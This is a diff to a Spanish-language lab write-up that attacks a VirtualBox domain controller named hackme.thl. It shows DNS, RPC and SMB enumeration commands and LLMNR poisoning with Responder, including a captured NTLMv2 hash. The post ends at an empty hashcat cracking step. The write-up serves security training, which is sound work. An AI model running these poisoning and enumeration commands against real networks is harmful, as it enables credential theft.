@@ -12,7 +12,9 @@ image: https://github.com/user-attachments/assets/314a021e-123d-4111-ae5c-49c919
 ## Useful Skills
 
 * DNS Enumeration (dig)
-* 
+* RCP Enumeration (rpcclient)
+* SMB Enumeration (netexec)
+* LLMNR Poisoning (responder)
 
 ## Enumeration
 
@@ -112,4 +114,82 @@ PORT      STATE  SERVICE
 MAC Address: 08:00:27:7F:C9:C3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
 Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
+```
+> Hay que añadir el dominio hackme.thl y el FQDN DC.hackme.thl en el archivo de configuración /etc/hosts para que se pueda resolver el nombre de dominio a la dirección IP 192.168.1.138
+{: .prompt-tip }
+
+### DNS Enumeration
+
+Intento obtener información adicional sobre el dominio a través de consultas DNS con dig, donde intento obtener los registros NS, MX, CNAME entre otros, posteriormente, trato de realizar una transferencia de zona, pero esta resulta fallida.
+
+```bash
+dig hackme.thl@192.168.1.138 axfr
+
+; <<>> DiG 9.20.4-4-Debian <<>> hackme.thl@192.168.1.138 axfr
+;; global options: +cmd
+; Transfer failed.
+```
+
+### RPC Enumeration
+
+Utilizo un null session para intentar enumerar información de todo los usuarios a través de RPC, pero el null session no se encuentra habilitado
+
+```bash
+rpcclient 192.168.1.138 -U "" -N -c enumdomusers
+result was NT_STATUS_ACCESS_DENIED`bash
+```
+
+### SMB Enumeration
+
+Utilizo NetExec para realizar un escaneo de SMB y obtener información clave como el sistema operativo, nombre del servidor, dominio, si la firma smb está habilita y si la versión antigua SMBv1 está activada o desactivada.
+
+```bash
+nxc smb 192.168.1.138
+SMB  192.168.1.138  445  DC  [*] Windows  10 / Server 2016 Build 14393 x64  (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False)
+```
+
+Utilizo NetExec para enumerar los recursos compartidos del sistema a través del protocolo SMB con autenticación nula, pero no es posible
+
+```bash
+nxc smb 192.168.1.138 -u ' ' -p '' --shares
+SMB  192.168.1.138  445  DC  [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False)
+SMB  192.168.1.138  445  DC  [-] hackme.thl\ : STATUS_LOGON_FAILURE 
+```
+## Exploitation
+
+### LLMNR Poisoning
+
+Ejecuto la herramienta responder y la dejo en segundo plano, para así intentar capturar hashes NTLMv2 de usuarios autenticados en la red. Si algún usuario del dominio intenta acceder a un recurso de red (SMB, Servidor, Web, etc...) y por alguna razón el recurso no existe Windows intenta resolver el nombre usando LLMNR o NetBIOS, lo que desembocará en que Windows envíe las credenciales del usuario en forma de hash NTLMv2 a mi recurso falso.
+
+```bash
+python3 Responder.py -I eth0 -wd
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
+
+[+] Listening for events...
+
+[*] [DHCP] Found DHCP server IP: 192.168.1.1, now waiting for incoming requests...
+[*] [NBT-NS] Poisoned answer sent to 192.168.1.138 for name SQLSERVER (service: File Server)
+[*] [LLMNR]  Poisoned answer sent to fe80::74e2:7d8f:9f17:89fc for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to fe80::74e2:7d8f:9f17:89fc for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to fe80::9848:a4af:2563:6e54 for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to 192.168.1.138 for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to fe80::9848:a4af:2563:6e54 for name SQLserver
+[*] [LLMNR]  Poisoned answer sent to 192.168.1.138 for name SQLserver
+[SMB] NTLMv2-SSP Client   : fe80::74e2:7d8f:9f17:89fc
+[SMB] NTLMv2-SSP Username : hackme\jdoe
+[SMB] NTLMv2-SSP Hash     : jdoe::hackme:faa58de1eb3d1697:AAB3D6BA09ABCC85ED1F843AF879EBE3:0101000000000000000855D3987CDB0167B939FA04E68AAD0000000002000800540032003500390001001E00570049004E002D0030003800300032004700460030004F005A005700520004003400570049004E002D0030003800300032004700460030004F005A00570052002E0054003200350039002E004C004F00430041004C000300140054003200350039002E004C004F00430041004C000500140054003200350039002E004C004F00430041004C0007000800000855D3987CDB01060004000200000008003000300000000000000000000000004000001AD337D04DF3A7641AB484A3BE312D3DF4FB5C6AB976C6A49E2347AC10EBE5740A0010000000000000000000000000000000000009001C0063006900660073002F00530051004C00730065007200760065007200000000000000000000000000
+```
+
+Tras un rato de espera consigo obtener una hash NTLMv2, el cual consigo crackear de forma offline con hashcat
+
+```bash
+
 ```
